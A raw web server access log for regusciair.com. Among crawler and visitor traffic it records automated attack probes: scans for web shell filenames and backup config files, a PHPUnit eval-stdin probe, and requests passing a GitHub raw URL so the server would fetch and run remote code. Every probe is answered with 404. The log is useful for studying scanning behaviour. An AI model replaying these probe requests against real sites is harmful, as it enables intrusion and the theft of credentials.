178.22.49.219 - - [24/Sep/2022:17:04:03 -0700] "GET /contact_us/ HTTP/1.1" 200 37527 "https://regusciair.com/contact_us/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.42" "regusciair.com"
178.128.219.183 - - [24/Sep/2022:20:39:21 -0700] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 73 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" "regusciair.com"
157.55.39.194 - - [24/Sep/2022:21:00:30 -0700] "GET /robots.txt HTTP/1.1" 200 57 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
157.55.39.222 - - [24/Sep/2022:21:00:35 -0700] "GET /yahoo_site_admin/assets/images/DSCF5139.11055053_large.JPG HTTP/1.1" 200 187019 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
172.106.171.252 - - [24/Sep/2022:21:20:58 -0700] "POST / HTTP/1.1" 200 26600 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "regusciair.com"
172.106.171.252 - - [24/Sep/2022:21:21:04 -0700] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 88 "-" "python-requests/2.27.1" "regusciair.com"
157.55.39.222 - - [24/Sep/2022:21:34:07 -0700] "GET /news HTTP/1.1" 200 4169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
51.222.253.4 - - [24/Sep/2022:21:38:23 -0700] "GET /robots.txt HTTP/1.1" 200 57 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "www.regusciair.com"
51.222.253.7 - - [24/Sep/2022:21:38:29 -0700] "GET / HTTP/1.1" 200 26600 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "www.regusciair.com"
46.161.27.155 - - [24/Sep/2022:22:04:06 -0700] "GET /wp-login.php HTTP/1.1" 500 2141 "http://regusciair.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" "regusciair.com"
207.46.13.209 - - [24/Sep/2022:22:05:38 -0700] "GET /contacto HTTP/1.1" 200 9735 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
207.46.13.209 - - [24/Sep/2022:22:05:39 -0700] "GET /donate_-_donar HTTP/1.1" 200 4713 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
40.77.167.46 - - [24/Sep/2022:22:05:42 -0700] "GET /reports HTTP/1.1" 200 10601 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
109.174.114.110 - - [24/Sep/2022:22:49:20 -0700] "GET /contact_us/ HTTP/1.1" 200 37527 "https://regusciair.com/contact_us/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.42" "regusciair.com"
159.65.219.142 - - [24/Sep/2022:22:56:41 -0700] "GET /wp-login.php HTTP/1.1" 404 88 "http://regusciair.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96" "regusciair.com"
157.55.39.222 - - [24/Sep/2022:23:04:11 -0700] "GET /sitemap.xml HTTP/1.1" 200 293 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "regusciair.com"
157.55.39.222 - - [25/Sep/2022:01:39:07 -0700] "GET /sitemap.xml HTTP/1.1" 200 293 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "regusciair.com"
207.46.13.209 - - [25/Sep/2022:02:31:12 -0700] "GET /inversores HTTP/1.1" 200 3542 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "regusciair.com"
124.217.251.187 - - [25/Sep/2022:02:41:49 -0700] "GET /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36" "regusciair.com"
54.36.149.52 - - [25/Sep/2022:03:23:49 -0700] "GET /robots.txt HTTP/1.1" 200 57 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "regusciair.com"
20.169.23.39 - - [25/Sep/2022:03:34:21 -0700] "POST / HTTP/1.1" 200 26600 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "regusciair.com"
45.14.105.133 - - [25/Sep/2022:03:41:59 -0700] "GET /contact_us/ HTTP/1.1" 200 37527 "https://regusciair.com/contact_us/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" "regusciair.com"
45.14.105.133 - - [25/Sep/2022:03:42:08 -0700] "POST /contact_us/ HTTP/1.1" 200 37527 "https://regusciair.com/contact_us/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" "regusciair.com"
217.146.2.41 - - [25/Sep/2022:04:04:26 -0700] "GET /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36" "regusciair.com"
217.146.2.41 - - [25/Sep/2022:04:04:28 -0700] "POST /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36" "regusciair.com"
217.146.2.41 - - [25/Sep/2022:04:04:30 -0700] "GET /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36" "regusciair.com"
114.99.7.192 - - [25/Sep/2022:04:06:15 -0700] "GET /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "regusciair.com"
119.29.4.9 - - [25/Sep/2022:04:29:28 -0700] "GET /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" "regusciair.com"
119.29.4.9 - - [25/Sep/2022:04:29:31 -0700] "POST /contacto/ HTTP/1.1" 200 37697 "https://regusciair.com/contacto/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" "regusciair.com"
207.46.13.209 - - [25/Sep/2022:05:11:58 -0700] "GET / HTTP/1.1" 200 26600 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "regusciair.com"
118.113.196.31 - - [25/Sep/2022:05:12:24 -0700] "GET / HTTP/1.1" 200 26600 "http://www.openurls.com.cn/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" "regusciair.com"
118.113.196.31 - - [25/Sep/2022:05:13:00 -0700] "GET /favicon.ico HTTP/1.1" 404 88 "https://regusciair.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" "regusciair.com"
207.46.13.209 - - [25/Sep/2022:06:15:04 -0700] "GET / HTTP/1.1" 200 26600 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.regusciair.com"
40.77.167.46 - - [25/Sep/2022:06:34:47 -0700] "GET /videos HTTP/1.1" 200 4981 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:55:47 -0700] "GET /style.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:55:54 -0700] "GET /wp-content/plugins/t_file_wp/t_file_wp.php?test=hello HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:02 -0700] "GET /admin.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:13 -0700] "GET /index.php?3x=3x HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:27 -0700] "GET /boom.php?x HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:31 -0700] "GET /wp-content/plugins/backup_index.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:38 -0700] "GET /wp-content/db_cache.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:43 -0700] "GET /wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:50 -0700] "GET /xmlrp.php?url=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:56:55 -0700] "GET /wpindex.php?idb=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:04 -0700] "GET /larva.php?idb=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:11 -0700] "GET /th3_err0r.php?php=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:23 -0700] "GET /alfindex.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:38 -0700] "GET /alfa.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:45 -0700] "GET /wp-booking.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:52 -0700] "GET /cindex.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:57:58 -0700] "GET /wp-content/wp-1ogin_bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:03 -0700] "GET /wp-1ogin_bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:10 -0700] "GET /wp-includes/fonts/css.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:16 -0700] "GET /wp-includes/css/css.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:27 -0700] "GET /old-index.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:35 -0700] "GET /config.bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:40 -0700] "GET /wp-admin/config.bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:45 -0700] "GET /wp-content/config.bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:58:53 -0700] "GET /wp-includes/config.bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:01 -0700] "GET /wp-content/themes/config.bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:09 -0700] "GET /wp-content/plugins/config.bak.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:13 -0700] "POST /wp-includes/css/wp-config.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:20 -0700] "GET /wp-content/plugins/ubh/up.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:28 -0700] "GET /wp-includes/wpconfig.bak.php?act=sf HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:33 -0700] "GET /wp-content/plugins/wpconfig.bak.php?act=sf HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:41 -0700] "GET /haders.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:06:59:46 -0700] "GET /wp-content/wp-old-index.php?action=login&pass=-1&submit= HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:07:00:02 -0700] "GET /legion.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:07:00:06 -0700] "GET /wp-content/mu-plugins/db-safe-mode.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:07:00:12 -0700] "GET /wp-includes/lfx.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
116.203.249.63 - - [25/Sep/2022:07:00:18 -0700] "GET /wp-includes/small.php HTTP/1.1" 404 88 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36" "regusciair.com"
